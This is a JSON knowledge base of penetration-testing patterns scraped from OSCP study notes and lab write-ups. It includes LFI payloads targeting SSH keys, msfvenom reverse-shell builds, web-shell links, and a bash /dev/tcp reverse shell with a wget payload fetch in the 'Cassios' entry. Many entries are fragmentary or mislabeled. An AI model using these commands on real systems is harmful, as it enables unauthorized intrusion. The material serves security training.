@@ -1,0 +1,1469 @@
+[
+  {
+    "id": "general-1",
+    "type": "ExploitPattern",
+    "category": "GENERAL",
+    "title": "-A all simple enumeration",
+    "description": "https://www.hackingarticles.in/active-directory-pentesting-lab-setup/ https://twitter.com/hackthebox_eu/status/1529122562038456320?cxt=HHwWgICzhcu3xLgqAAAA https://tryhackme.com/room/breachingad https://academy.hackthebox.com/module/details/143 https://github.com/Integration-IT/Active-Directory-Exploitation-Cheat-Sheet https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Active%20Directory%20Attack.md https://zer1t0.gitlab.io/posts/attacking_ad/#what-is-active-directory",
+    "techniques": [
+      "BloodHound ([SharpHoundCheatSheet](https://bloodhound.readthedocs.io/en/latest/_images/SharpHoundCheatSheet.png))",
+      "PowerShell Empire",
+      "Responder (Poisoning and spoofing are not allowed in the labs or on the exam.)",
+      "`To run in analyze mode, use the \"-A\" parameter.`",
+      "`To display the hash every time, use the \"-v\" parameter.`",
+      "Crackmapexec => [NetExec](https://github.com/Pennyw0rth/NetExec)",
+      "ForceChangePassword",
+      "BACKUP OPERATORS",
+      "Exporting AD member hashes",
+      "Dumping tickets",
+      "Dumping credentials from lsass",
+      "Pass the Hash",
+      "- Crackmapexec => [NetExec](https://github.com/Pennyw0rth/NetExec)",
+      "- Mimikatz",
+      "- [linWinPwn](https://github.com/lefayjey/linWinPwn) - Active Directory Vulnerability Scanner",
+      "- [ADMiner](https://github.com/Mazars-Tech/AD_Miner) - Using Cypher queries on the BloodHound graph database (Neo4j) generates a web-based report",
+      "![AD drawio](https://github.com/tedchen0001/OSCP-Notes/blob/master/Pic/AD/AD.drawio.png)",
+      "service scan, domain information, check for",
+      "Enumerating Users",
+      "add target domain /etc/hosts, if needed"
+    ],
+    "indicators": [],
+    "tags": [
+      "web",
+      "general"
+    ],
+    "confidence": 0.5
+  },
+  {
+    "id": "general-2",
+    "type": "ExploitPattern",
+    "category": "GENERAL",
+    "title": "BOF",
+    "description": "https://www.youtube.com/watch?v=qSnPayW6F7U https://tryhackme.com/room/bufferoverflowprep https://github.com/Tib3rius/Pentest-Cheatsheets/blob/master/exploits/buffer-overflows.rst",
+    "techniques": [],
+    "indicators": [],
+    "tags": [
+      "web",
+      "general"
+    ],
+    "confidence": 0.5
+  },
+  {
+    "id": "general-3",
+    "type": "ExploitPattern",
+    "category": "GENERAL",
+    "title": "Find subdomains silently and pipe to dnsx for resolution",
+    "description": "A curated list of tools, commands, and resources for web application security testing and bug bounty hunting. This phase focuses on gathering information and mapping the attack surface. *   A fast and passive subdomain discovery tool. *   :star: **Note:** [Post-install configuration](https://docs.projectdiscovery.io/tools/subfinder/install#post-install-configuration) is recommended for optimal results. subfinder -silent -d  | dnsx -silent > /tmp/servers.txt sudo nmap -iL /tmp/servers.txt -Pn -sT *   **ffuf (Fuzz Faster U Fool)**",
+    "techniques": [
+      "**Subfinder**",
+      "A fast and passive subdomain discovery tool.",
+      ":star: **Note:** [Post-install configuration](https://docs.projectdiscovery.io/tools/subfinder/install#post-install-configuration) is recommended for optimal results.",
+      "**ffuf (Fuzz Faster U Fool)**",
+      "A versatile web fuzzer for subdomain discovery.",
+      "**Fuzzing through Tor**",
+      "An automated OSINT framework that can be used for subdomain enumeration.",
+      "**[Outgoing Port Tester](http://portquiz.net/)**: An online utility to test for open outgoing ports from a network.",
+      "**[dirsearch](https://github.com/maurosoria/dirsearch)**: A command-line tool designed to brute force directories and files in web servers.",
+      "**[Arjun](https://github.com/s0md3v/Arjun)**: A tool for finding hidden HTTP parameters.",
+      "**[Wayback Machine](https://wayback-api.archive.org/)**: Access historical snapshots of websites to find old or forgotten endpoints and files.",
+      "**[Nuclei](https://github.com/projectdiscovery/nuclei)**: :star: A powerful and fast template-based vulnerability scanner.",
+      "**[Google Maps API Scanner](https://github.com/ozguralp/gmapsapiscanner)**: A tool to find misconfigured Google Maps API implementations.",
+      "**Google Dorks**",
+      "Utilize advanced Google search operators to uncover sensitive information.",
+      "**Resource:** [taksec.github.io](https://taksec.github.io/google-dorks-bug-bounty/)",
+      "**IIS Short Filename (Tilde) Scanner**",
+      "**[IIS-ShortName-Scanner](https://github.com/irsdl/iis-shortname-scanner)**",
+      "**[Shortscan](https://github.com/bitquark/shortscan)**",
+      "**[dalfox](https://github.com/hahwul/dalfox)**: An open-source XSS scanner and parameter analysis tool."
+    ],
+    "indicators": [],
+    "tags": [
+      "web",
+      "general"
+    ],
+    "confidence": 0.5
+  },
+  {
+    "id": "general-4",
+    "type": "ExploitPattern",
+    "category": "GENERAL",
+    "title": "BurpSuite",
+    "description": "![image](https://github.com/tedchen0001/OSCP-Notes/blob/master/Pic/BurpSuite/BurpSuite_2021.11.27_13h02m31s_001_.png) ![image](https://github.com/tedchen0001/OSCP-Notes/blob/master/Pic/BurpSuite/BurpSuite_2021.11.27_13h05m02s_002_.png) ![image](https://github.com/tedchen0001/OSCP-Notes/blob/master/Pic/BurpSuite/BurpSuite_2021.11.27_13h06m15s_003_.png) ![image](https://github.com/tedchen0001/OSCP-Notes/blob/master/Pic/BurpSuite/BurpSuite_2021.11.27_13h06m34s_004_.png) https://www.vidocsecurity.com/blog/401-and-403-bypass-how-to-do-it-right/",
+    "techniques": [],
+    "indicators": [],
+    "tags": [
+      "web",
+      "general"
+    ],
+    "confidence": 0.5
+  },
+  {
+    "id": "general-5",
+    "type": "ExploitPattern",
+    "category": "GENERAL",
+    "title": "CVE",
+    "description": "https://github.com/unamer/CVE-2018-8120 (e.g. OffsecPG:Authby Win2008 x86)",
+    "techniques": [],
+    "indicators": [],
+    "tags": [
+      "web",
+      "general"
+    ],
+    "confidence": 0.5
+  },
+  {
+    "id": "general-7",
+    "type": "ExploitPattern",
+    "category": "GENERAL",
+    "title": "check the type of the private key used for authentication",
+    "description": "https://github.com/carlospolop/Auto_Wordlists/blob/main/wordlists/file_inclusion_windows.txt https://github.com/carlospolop/Auto_Wordlists/blob/main/wordlists/file_inclusion_linux.txt https://github.com/carlospolop/Auto_Wordlists/blob/main/custom_wordlists/file_inclusion_linux.txt https://github.com/danielmiessler/SecLists/tree/master/Fuzzing/LFI wfuzz -c -w file_inclusion_linux.txt --hw 0 http:///download.php?downloadurl=FUZZ ../../../../../home//.ssh/authorized_keys ../../../../../home//.ssh/id_rsa",
+    "techniques": [
+      "wfuzz -c -w file_inclusion_linux.txt --hw 0 http:///download.php?downloadurl=FUZZ",
+      "../../../../../home//.ssh/authorized_keys",
+      "../../../../../home//.ssh/id_rsa",
+      "../../../../../home//.ssh/id_ecdsa",
+      "../../../../../home//.ssh/id_dsa",
+      "../../../../../../../../../../../../../../../",
+      "/opt/apache2/conf/httpd.conf",
+      "wfuzz -u http:///download.php?downloadurl=/proc/FUZZ/cmdline -z range,1-1000 --hw 1",
+      "curl http:///download.php?downloadurl=/proc/824/cmdline --output service.txt",
+      "Burp Suite",
+      ":star: PHP filter chain",
+      "https://github.com/wupco/PHP_INCLUDE_TO_SHELL_CHAR_DICT",
+      "https://ctftime.org/writeup/36071",
+      "https://www.youtube.com/watch?v=0ZMpwb2fGmU",
+      "- method1",
+      "attacker",
+      "target"
+    ],
+    "indicators": [],
+    "tags": [
+      "web",
+      "general"
+    ],
+    "confidence": 0.5
+  },
+  {
+    "id": "general-8",
+    "type": "ExploitPattern",
+    "category": "GENERAL",
+    "title": "e.g., scp tester@192.168.10.99:/Users/tester/Desktop/123.txt /tmp/123.txt",
+    "description": ":arrow_forward: Downloading a file from the server with SSH :arrow_forward: Uploading a file from target server to our local HTTP server from BaseHTTPServer import HTTPServer, BaseHTTPRequestHandler class PUTHandler(BaseHTTPRequestHandler): length = int(self.headers['Content-Length']) content = self.rfile.read(length) with open(self.path[1:], \"w\") as f: print(\"Starting a HTTP PUT Server on {0} port {1} (http://{0}:{1}) ...\".format(sys.argv[1], port)) server_address = (sys.argv[1], port) httpd = HTTPServer(server_address, PUTHandler)",
+    "techniques": [
+      ":arrow_forward: Uploading a file from target server to our local HTTP server",
+      "HTTPutServer.py",
+      "Target host uploads files",
+      "Windows",
+      "Using `nc` to listen on port N",
+      "Checking if the file is correct",
+      "attacker",
+      "target"
+    ],
+    "indicators": [],
+    "tags": [
+      "web",
+      "general"
+    ],
+    "confidence": 0.5
+  },
+  {
+    "id": "general-10",
+    "type": "ExploitPattern",
+    "category": "GENERAL",
+    "title": "MSFVenom",
+    "description": "https://book.hacktricks.xyz/shells/shells/msfvenom msfvenom -p windows/shell_reverse_tcp -f dll LHOST= LPORT= -o xxx.dll msfvenom -p windows/x64/shell_reverse_tcp -f dll LHOST= LPORT= -o xxx.dll msfvenom -p windows/shell/reverse_tcp LHOST= LPORT= -f exe -o shell-x86.exe msfvenom -p windows/x64/shell_reverse_tcp LHOST= LPORT= -f exe -o shell-x64.exe Stageless Payloads for Windows(try first) msfvenom -p windows/shell_reverse_tcp LHOST= LPORT= -f exe -o shell-x86.exe msfvenom -p windows/x64/shell_reverse_tcp LHOST= LPORT= -f exe -o shell-x64.exe",
+    "techniques": [
+      "msfvenom -p windows/shell_reverse_tcp -f dll LHOST= LPORT= -o xxx.dll",
+      "msfvenom -p windows/x64/shell_reverse_tcp -f dll LHOST= LPORT= -o xxx.dll",
+      "msfvenom -p windows/shell/reverse_tcp LHOST= LPORT= -f exe -o shell-x86.exe",
+      "msfvenom -p windows/x64/shell_reverse_tcp LHOST= LPORT= -f exe -o shell-x64.exe",
+      "msfvenom -p windows/shell_reverse_tcp LHOST= LPORT= -f exe -o shell-x86.exe",
+      "msfvenom -p php/reverse_php LHOST= LPORT= -f raw -b '\"' > evil.png",
+      "echo -e \" evil.png"
+    ],
+    "indicators": [],
+    "tags": [
+      "web",
+      "general"
+    ],
+    "confidence": 0.5
+  },
+  {
+    "id": "general-11",
+    "type": "ExploitPattern",
+    "category": "GENERAL",
+    "title": "Metasploit",
+    "description": "(Metasploit Restrictions in OSCP Exam) https://help.offensive-security.com/hc/en-us/articles/360040165632-OSCP-Exam-Guide Exploit completed, but no session was created.",
+    "techniques": [
+      "msf5> show options",
+      "msf5> set LHOST"
+    ],
+    "indicators": [],
+    "tags": [
+      "web",
+      "general"
+    ],
+    "confidence": 0.5
+  },
+  {
+    "id": "general-12",
+    "type": "ExploitPattern",
+    "category": "GENERAL",
+    "title": "save output to a file",
+    "description": "- [MySQL 4.x/5.0](https://www.exploit-db.com/exploits/1518) mysql -u [username] -p [dbname] -e [query] > [filename] mysql -u root -p -e \"system id\" https://steflan-security.com/linux-privilege-escalation-exploiting-user-defined-functions/",
+    "techniques": [
+      "Linux Privilege Escalation"
+    ],
+    "indicators": [],
+    "tags": [
+      "web",
+      "general"
+    ],
+    "confidence": 0.5
+  },
+  {
+    "id": "general-13",
+    "type": "ExploitPattern",
+    "category": "GENERAL",
+    "title": "OWASP Top Ten",
+    "description": "- [Top Ten](https://owasp.org/www-project-top-ten/) - [API-Security](https://github.com/OWASP/API-Security) - [OWASP Juice Shop](https://github.com/juice-shop/juice-shop): An intentionally insecure web application designed for security training and awareness. http://localhost:3000/#/score-board",
+    "techniques": [
+      "http://localhost:3000/#/score-board"
+    ],
+    "indicators": [],
+    "tags": [
+      "web",
+      "general"
+    ],
+    "confidence": 0.5
+  },
+  {
+    "id": "general-14",
+    "type": "ExploitPattern",
+    "category": "GENERAL",
+    "title": "OtherResources",
+    "description": "- https://www.youtube.com/c/dayzerosec - https://www.youtube.com/c/HackerSploit - https://www.youtube.com/c/LiveOverflow - https://www.twitch.tv/offsecofficial - https://www.twitch.tv/thecybermentor - https://blog.badsectorlabs.com/ - https://packetstormsecurity.com/ - https://www.youtube.com/watch?v=FqnSAa2KmBI&t=1254s - https://itnext.io/best-practices-for-writing-quality-vulnerability-reports-119882422a27",
+    "techniques": [
+      "https://www.youtube.com/c/dayzerosec",
+      "https://www.youtube.com/c/HackerSploit",
+      "https://www.youtube.com/c/LiveOverflow",
+      "https://www.twitch.tv/offsecofficial",
+      "https://www.twitch.tv/thecybermentor",
+      "https://blog.badsectorlabs.com/",
+      "https://packetstormsecurity.com/",
+      "https://dayzerosec.com/",
+      "https://www.youtube.com/watch?v=FqnSAa2KmBI&t=1254s",
+      "https://itnext.io/best-practices-for-writing-quality-vulnerability-reports-119882422a27"
+    ],
+    "indicators": [],
+    "tags": [
+      "web",
+      "general"
+    ],
+    "confidence": 0.5
+  },
+  {
+    "id": "general-15",
+    "type": "ExploitPattern",
+    "category": "GENERAL",
+    "title": "The uploaded file may not be visible in the upload directory.",
+    "description": "https://github.com/artyuum/Simple-PHP-Web-Shell/blob/master/index.php `disable_functions` = disabled commands https://github.com/six2dez/pentest-book/blob/master/enumeration/web/upload-bypasses.md We can attempt to upload the `.htaccess` file to configure the server to execute our custom file extensions as PHP scripts. echo \"AddType application/x-httpd-php \" > .htaccess echo \"AddType application/x-httpd-php .abc\" > .htaccess https://github.com/flozz/p0wny-shell/tree/master https://github.com/p0dalirius/Joomla-webshell-plugin",
+    "techniques": [
+      "https://github.com/artyuum/Simple-PHP-Web-Shell/blob/master/index.php",
+      "`disable_functions` = disabled commands",
+      "We can attempt to upload the `.htaccess` file to configure the server to execute our custom file extensions as PHP scripts.",
+      "Combine bypass, such as phar"
+    ],
+    "indicators": [],
+    "tags": [
+      "web",
+      "general"
+    ],
+    "confidence": 0.5
+  },
+  {
+    "id": "general-16",
+    "type": "ExploitPattern",
+    "category": "GENERAL",
+    "title": "Nmap 7.91 scan initiated Mon Nov  8 07:23:31 2021 as: nmap -vv --reason -Pn -T4 -sV -sC --version-all -A --osscan-guess -p- -oN /home/kali/Documents/OffSecPG/Authby/AutoRecon/results/192.168.80.46/scans/_full_tcp_nmap.txt -oX /home/kali/Documents/OffSecPG/Authby/AutoRecon/results/192.168.80.46/scans/xml/_full_tcp_nmap.xml 192.168.80.46",
+    "description": "![image](https://github.com/tedchen0001/OSCP-Notes/blob/master/Proving_Grounds_Writeups/Pic/Authby/rooted202111141710.png) Nmap scan report for 192.168.80.46 Host is up, received user-set (0.30s latency). Scanned at 2021-11-08 07:23:32 EST for 709s Not shown: 65531 filtered ports PORT     STATE SERVICE            REASON          VERSION 21/tcp   open  ftp                syn-ack ttl 127 zFTPServer 6.0 build 2011-10-17 | ftp-anon: Anonymous FTP login allowed (FTP code 230) | ----------   1 root     root      5610496 Oct 18  2011 zFTPServer.exe",
+    "techniques": [
+      "Nmap scan report for 192.168.80.46",
+      "Host is up, received user-set (0.30s latency).",
+      "Scanned at 2021-11-08 07:23:32 EST for 709s",
+      "Not shown: 65531 filtered ports",
+      "Reason: 65531 no-responses",
+      "PORT     STATE SERVICE            REASON          VERSION",
+      "21/tcp   open  ftp                syn-ack ttl 127 zFTPServer 6.0 build 2011-10-17",
+      "| ftp-anon: Anonymous FTP login allowed (FTP code 230)",
+      "| total 9680",
+      "| ----------   1 root     root      5610496 Oct 18  2011 zFTPServer.exe",
+      "| ----------   1 root     root           25 Feb 10  2011 UninstallService.bat",
+      "| ----------   1 root     root      4284928 Oct 18  2011 Uninstall.exe",
+      "| ----------   1 root     root           17 Aug 13  2011 StopService.bat",
+      "| ----------   1 root     root           18 Aug 13  2011 StartService.bat",
+      "| ----------   1 root     root         8736 Nov 09  2011 Settings.ini",
+      "| dr-xr-xr-x   1 root     root          512 Nov 08 20:20 log",
+      "| ----------   1 root     root         2275 Aug 09  2011 LICENSE.htm",
+      "| ----------   1 root     root           23 Feb 10  2011 InstallService.bat",
+      "| dr-xr-xr-x   1 root     root          512 Nov 08  2011 extensions",
+      "| dr-xr-xr-x   1 root     root          512 Nov 08  2011 certificates"
+    ],
+    "indicators": [],
+    "tags": [
+      "web",
+      "general"
+    ],
+    "confidence": 0.5
+  },
+  {
+    "id": "general-17",
+    "type": "ExploitPattern",
+    "category": "GENERAL",
+    "title": "Billyboss",
+    "description": "The website on port 8081 is running Sonatype Nexus service version 3.21.0-05. The credential is nexus///nexus.(only guess...refer to the official walkthrough) ![image](https://github.com/tedchen0001/OSCP-Notes/blob/master/Proving_Grounds_Writeups/Pic/Billyboss/Billyboss_2021.12.08_22h46m50s_001_.png) We can use [CVE-2020-10199](https://www.exploit-db.com/exploits/49385). I modify the exploit codes to download the ```nc.exe``` from my pc for executing the reverse shell command. ![image](https://github.com/tedchen0001/OSCP-Notes/blob/master/Proving_Grounds_Writeups/Pic/Billyboss/Billyboss_2021.12.12_12h50m27s_002_.png)",
+    "techniques": [
+      "msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.49.127 LPORT=80 -f dll -f csharp",
+      "certutil -f -urlcache http://192.168.49.127/cve-2020-0796-local.exe cve-2020-0796-local.exe"
+    ],
+    "indicators": [],
+    "tags": [
+      "web",
+      "general"
+    ],
+    "confidence": 0.5
+  },
+  {
+    "id": "general-18",
+    "type": "ExploitPattern",
+    "category": "GENERAL",
+    "title": "Nmap 7.92 scan initiated Sun Feb 27 04:50:54 2022 as: nmap -vv --reason -Pn -T4 -sV -sC --version-all -A --osscan-guess -p- -oN /home/kali/Documents/AutoRecon/results/192.168.184.63/scans/_full_tcp_nmap.txt -oX /home/kali/Documents/AutoRecon/results/192.168.184.63/scans/xml/_full_tcp_nmap.xml 192.168.184.63",
+    "description": "![Butch](https://user-images.githubusercontent.com/8998412/158007932-e61409eb-080e-48b8-b874-5d395cd7d659.png) Nmap scan report for 192.168.184.63 Host is up, received user-set (0.30s latency). Scanned at 2022-02-27 04:50:54 EST for 477s Not shown: 65528 filtered tcp ports (no-response) PORT     STATE SERVICE       REASON          VERSION 21/tcp   open  ftp           syn-ack ttl 127 Microsoft ftpd 25/tcp   open  smtp          syn-ack ttl 127 Microsoft ESMTP 10.0.17763.1 | smtp-commands: butch Hello [192.168.49.184], TURN, SIZE 2097152, ETRN, PIPELINING, DSN, ENHANCEDSTATUSCODES, 8bitmime, BINARYMIME, CHUNKING, VRFY, OK",
+    "techniques": [
+      "Nmap scan report for 192.168.184.63",
+      "Host is up, received user-set (0.30s latency).",
+      "Scanned at 2022-02-27 04:50:54 EST for 477s",
+      "Not shown: 65528 filtered tcp ports (no-response)",
+      "PORT     STATE SERVICE       REASON          VERSION",
+      "21/tcp   open  ftp           syn-ack ttl 127 Microsoft ftpd",
+      "| ftp-syst:",
+      "|_  SYST: Windows_NT",
+      "25/tcp   open  smtp          syn-ack ttl 127 Microsoft ESMTP 10.0.17763.1",
+      "| smtp-commands: butch Hello [192.168.49.184], TURN, SIZE 2097152, ETRN, PIPELINING, DSN, ENHANCEDSTATUSCODES, 8bitmime, BINARYMIME, CHUNKING, VRFY, OK",
+      "|_ This server supports the following commands: HELO EHLO STARTTLS RCPT DATA RSET MAIL QUIT HELP AUTH TURN ETRN BDAT VRFY",
+      "135/tcp  open  msrpc         syn-ack ttl 127 Microsoft Windows RPC",
+      "139/tcp  open  netbios-ssn   syn-ack ttl 127 Microsoft Windows netbios-ssn",
+      "445/tcp  open  microsoft-ds? syn-ack ttl 127",
+      "450/tcp  open  http          syn-ack ttl 127 Microsoft IIS httpd 10.0",
+      "|_http-server-header: Microsoft-IIS/10.0",
+      "|_http-title: Butch",
+      "| http-methods:",
+      "|   Supported Methods: OPTIONS TRACE GET HEAD POST",
+      "|_  Potentially risky methods: TRACE"
+    ],
+    "indicators": [],
+    "tags": [
+      "web",
+      "general"
+    ],
+    "confidence": 0.5
+  },
+  {
+    "id": "general-19",
+    "type": "ExploitPattern",
+    "category": "GENERAL",
+    "title": "Cassios",
+    "description": "echo 'bash -i >& /dev/tcp/192.168.49.129/80 0>&1' > shell.sh ; chmod +x shell.sh java -jar ysoserial-master-d367e379d9-1.jar CommonsCollections2 'wget http://192.168.49.129/shell.sh -O /tmp/shell.sh' > recycler.ser smbclient --no-pass -N \"\\\\\\\\192.168.129.116\\\\Samantha Konstan\" -p 445 put /home/kali/Documents/OffSecPG/Cassios/recycler.ser recycler.ser java -jar ysoserial-master-d367e379d9-1.jar CommonsCollections2 'bash /tmp/shell.sh' > recycler.ser smbclient --no-pass -N \"\\\\\\\\192.168.129.116\\\\Samantha Konstan\" -p 445",
+    "techniques": [
+      "echo 'bash -i >& /dev/tcp/192.168.49.129/80 0>&1' > shell.sh ; chmod +x shell.sh",
+      "java -jar ysoserial-master-d367e379d9-1.jar CommonsCollections2 'wget http://192.168.49.129/shell.sh -O /tmp/shell.sh' > recycler.ser",
+      "smbclient --no-pass -N \"\\\\\\\\192.168.129.116\\\\Samantha Konstan\" -p 445",
+      "put /home/kali/Documents/OffSecPG/Cassios/recycler.ser recycler.ser",
+      "java -jar ysoserial-master-d367e379d9-1.jar CommonsCollections2 'bash /tmp/shell.sh' > recycler.ser"
+    ],
+    "indicators": [],
+    "tags": [
+      "web",
+      "general"
+    ],
+    "confidence": 0.5
+  },
+  {
+    "id": "general-20",
+    "type": "ExploitPattern",
+    "category": "GENERAL",
+    "title": "Nmap 7.91 scan initiated Wed Oct 27 11:46:29 2021 as: nmap -vv --reason -Pn -T4 -sV -sC --version-all -A --osscan-guess -p- -oN /home/kali/Documents/OffSecPG/Catto/AutoRecon/results/192.168.206.139/scans/_full_tcp_nmap.txt -oX /home/kali/Documents/OffSecPG/Catto/AutoRecon/results/192.168.206.139/scans/xml/_full_tcp_nmap.xml 192.168.206.139",
+    "description": "![image](https://github.com/tedchen0001/OSCP-Notes/blob/master/Proving_Grounds_Writeups/Pic/Catto/rooted202110302303.png) nmap -vv --reason -Pn -T4 -sV -sC --version-all -A --osscan-guess -p- -oN \"/home/kali/Documents/OffSecPG/Catto/AutoRecon/results/192.168.206.139/scans/_full_tcp_nmap.txt\" -oX \"/home/kali/Documents/OffSecPG/Catto/AutoRecon/results/192.168.206.139/scans/xml/_full_tcp_nmap.xml\" 192.168.206.139 [/home/kali/Documents/OffSecPG/Catto/AutoRecon/results/192.168.206.139/scans/_full_tcp_nmap.txt](file:///home/kali/Documents/OffSecPG/Catto/AutoRecon/results/192.168.206.139/scans/_full_tcp_nmap.txt):",
+    "techniques": [
+      "nmap -vv --reason -Pn -T4 -sV -sC --version-all -A --osscan-guess -p- -oN \"/home/kali/Documents/OffSecPG/Catto/AutoRecon/results/192.168.206.139/scans/_full_tcp_nmap.txt\" -oX \"/home/kali/Documents/OffSecPG/Catto/AutoRecon/results/192.168.206.139/scans/xml/_full_tcp_nmap.xml\" 192.168.206.139",
+      "Increasing send delay for 192.168.206.139 from 0 to 5 due to 1297 out of 3241 dropped probes since last increase.",
+      "adjust_timeouts2: packet supposedly had rtt of -1835560 microseconds.  Ignoring time.",
+      "Nmap scan report for 192.168.206.139",
+      "Host is up, received user-set (0.21s latency).",
+      "Scanned at 2021-10-27 11:46:31 EDT for 1205s",
+      "Not shown: 65528 closed ports",
+      "Reason: 65528 resets",
+      "PORT      STATE SERVICE REASON         VERSION",
+      "8080/tcp  open  http    syn-ack ttl 63 nginx 1.14.1",
+      "| http-methods:",
+      "|_  Supported Methods: GET HEAD",
+      "|_http-server-header: nginx/1.14.1",
+      "|_http-title: Identity by HTML5 UP",
+      "18080/tcp open  http    syn-ack ttl 63 Apache httpd 2.4.37 ((centos))",
+      "|   Supported Methods: HEAD GET POST OPTIONS TRACE",
+      "|_  Potentially risky methods: TRACE",
+      "|_http-server-header: Apache/2.4.37 (centos)",
+      "|_http-title: CentOS \\xE6\\x8F\\x90\\xE4\\xBE\\x9B\\xE7\\x9A\\x84 Apache HTTP \\xE6\\x9C\\x8D\\xE5\\x8A\\xA1\\xE5\\x99\\xA8\\xE6\\xB5\\x8B\\xE8\\xAF\\x95\\xE9\\xA1\\xB5",
+      "30330/tcp open  http    syn-ack ttl 63 Node.js Express framework"
+    ],
+    "indicators": [],
+    "tags": [
+      "web",
+      "general"
+    ],
+    "confidence": 0.5
+  },
+  {
+    "id": "general-21",
+    "type": "ExploitPattern",
+    "category": "GENERAL",
+    "title": "Exploit Title: Blind SQL injection in WebERP.",
+    "description": "Performing network service reconnaissance using Nmap. └─$ sudo nmap --min-rate 1000 -p- -Pn 192.168.175.227 -sC -sV Starting Nmap 7.93 ( https://nmap.org ) at 2023-03-04 10:21 CST Nmap scan report for 192.168.175.227 Not shown: 65533 filtered tcp ports (no-response) 22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0) |   3072 62361a5cd3e37be170f8a3b31c4c2438 (RSA) |   256 ee25fc236605c0c1ec47c6bb00c74f53 (ECDSA) |_  256 835c51ac32e53a217cf6c2cd936858d8 (ED25519) 80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))",
+    "techniques": [
+      "Trying to log in using common credentials and SQL injection, but unable to gain access.",
+      "![image](https://github.com/tedchen0001/OSCP-Notes/blob/master/Proving_Grounds_Writeups/Pic/ERP/ERP_20230303_224723_001.png)",
+      "Continuing our search of the web directory, we find a robots.txt file that provides an additional link to `/weberp/index.php`.",
+      "We are able to log in successfully using the credentials we found on Google.",
+      "Note that logging into this ERP system may be a bit slow.",
+      "Once we log in, we can verify that the system version is 4.15 and identify a related vulnerability.",
+      "We test the vulnerability and confirm that the PoC codes works properly. Note that both the `path` and `order` parameters must be entered correctly. It took me a lot of time to test.",
+      "Although this PoC codes is only for blind SQL injection testing, we can modify it to retrieve the data, just like in sqlmap. I refer to other SQL injection testing codes and modify our PoC codes accordingly. The results are as follows:",
+      "As you can see, we have found another database named `inoerp_db`. Although we could try to modify the code to continue retrieving tables and more information, but it would take a lot of time. So, let's try googling the database name and see what we can find.",
+      "Now that we know it is another ERP system, perhaps it has been installed on our target host and has vulnerabilities?",
+      "Although the vulnerability version is not applicable, we can still attempt to use it and see what happens.",
+      "We have obtained a reverse shell.",
+      "We have found an active port 8443 that was not visible during the initial nmap scan.",
+      "Use `chisel` to forward the service.",
+      "Use port 80 on our host to listen to the forwarding.",
+      "Execute the following command on the target host."
+    ],
+    "indicators": [],
+    "tags": [
+      "web",
+      "general"
+    ],
+    "confidence": 0.5
+  },
+  {
+    "id": "general-22",
+    "type": "ExploitPattern",
+    "category": "GENERAL",
+    "title": "Nmap 7.91 scan initiated Sat Sep 25 11:29:21 2021 as: nmap -Pn -p- -sC -sV -T4 -oN Exfiltrated.nmap 192.168.107.163",
+    "description": "Nmap scan report for 192.168.107.163 22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0) |   3072 c1:99:4b:95:22:25:ed:0f:85:20:d3:63:b4:48:bb:cf (RSA) |   256 0f:44:8b:ad:ad:95:b8:22:6a:f0:36:ac:19:d0:0e:f3 (ECDSA) |_  256 32:e1:2a:6c:cc:7c:e6:3e:23:f4:80:8d:33:ce:9b:3a (ED25519) 80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu)) | http-robots.txt: 7 disallowed entries | /backup/ /cron/? /front/ /install/ /panel/ /tmp/ |_http-server-header: Apache/2.4.41 (Ubuntu) |_http-title: Did not follow redirect to http://exfiltrated.offsec/",
+    "techniques": [
+      "Nmap scan report for 192.168.107.163",
+      "Host is up (0.20s latency).",
+      "Not shown: 65533 closed ports",
+      "PORT   STATE SERVICE VERSION",
+      "22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)",
+      "| ssh-hostkey:",
+      "|   3072 c1:99:4b:95:22:25:ed:0f:85:20:d3:63:b4:48:bb:cf (RSA)",
+      "|   256 0f:44:8b:ad:ad:95:b8:22:6a:f0:36:ac:19:d0:0e:f3 (ECDSA)",
+      "|_  256 32:e1:2a:6c:cc:7c:e6:3e:23:f4:80:8d:33:ce:9b:3a (ED25519)",
+      "80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))",
+      "| http-robots.txt: 7 disallowed entries",
+      "| /backup/ /cron/? /front/ /install/ /panel/ /tmp/",
+      "|_/updates/",
+      "|_http-server-header: Apache/2.4.41 (Ubuntu)",
+      "|_http-title: Did not follow redirect to http://exfiltrated.offsec/",
+      "Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel",
+      "Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .",
+      "sudo vim /etc/hosts",
+      "python3 49876.py -u http://exfiltrated.offsec/panel/ -l admin -p admin",
+      "sudo apt install djvulibre-bin exiftool"
+    ],
+    "indicators": [],
+    "tags": [
+      "web",
+      "general"
+    ],
+    "confidence": 0.5
+  },
+  {
+    "id": "general-23",
+    "type": "ExploitPattern",
+    "category": "GENERAL",
+    "title": "Hepet",
+    "description": "![image](https://github.com/tedchen0001/OSCP-Notes/blob/master/Proving_Grounds_Writeups/Pic/Hepet/Walkthrough.png) nmap -Pn -p- -sV 192.168.239.140 -T4 -oN Hepet.nmap Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower. Starting Nmap 7.91 ( https://nmap.org ) at 2021-08-16 11:19 EDT Nmap scan report for 192.168.239.140 Not shown: 65522 filtered ports PORT      STATE SERVICE        VERSION 25/tcp    open  smtp           Mercury/32 smtpd (Mail server account Maiser)",
+    "techniques": [
+      "nmap -Pn -p- -sV 192.168.239.140 -T4 -oN Hepet.nmap",
+      "Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower.",
+      "Starting Nmap 7.91 ( https://nmap.org ) at 2021-08-16 11:19 EDT",
+      "Nmap scan report for 192.168.239.140",
+      "Host is up (0.21s latency).",
+      "Not shown: 65522 filtered ports",
+      "PORT      STATE SERVICE        VERSION",
+      "25/tcp    open  smtp           Mercury/32 smtpd (Mail server account Maiser)",
+      "79/tcp    open  finger         Mercury/32 fingerd",
+      "105/tcp   open  ph-addressbook Mercury/32 PH addressbook server",
+      "106/tcp   open  pop3pw         Mercury/32 poppass service",
+      "110/tcp   open  pop3           Mercury/32 pop3d",
